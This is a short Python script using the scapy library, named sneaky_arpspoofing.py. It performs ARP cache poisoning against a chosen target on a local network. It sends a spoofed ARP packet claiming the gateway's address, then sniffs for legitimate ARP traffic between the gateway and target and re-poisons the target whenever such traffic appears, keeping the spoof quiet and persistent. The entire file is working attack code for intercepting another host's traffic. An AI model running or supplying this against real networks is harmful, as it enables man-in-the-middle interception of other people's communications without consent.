from scapy.all import *
import sys


if len(sys.argv) != 7:
	print 'Usage sneaky_arpspoofing.py -i <iface> -t <target> -g <gateway>'
	exit(1)
else:
	iface = sys.argv[2]
	target = sys.argv[4]
	gateway = sys.argv[6]

	send(ARP(op=ARP.who_has, psrc=gateway, pdst=target))

	while True:
		
		pkt = sniff (count = 1, filter = 'arp[6:2] = 2 and src host ' + gateway + \
			' or arp[6:2] = 1 and dst host ' + target + ' and not ether host ' \
			+ get_if_hwaddr(iface), iface = iface)
		if pkt:
			send(ARP(op=ARP.who_has, psrc=gateway, pdst=target))
			del pkt
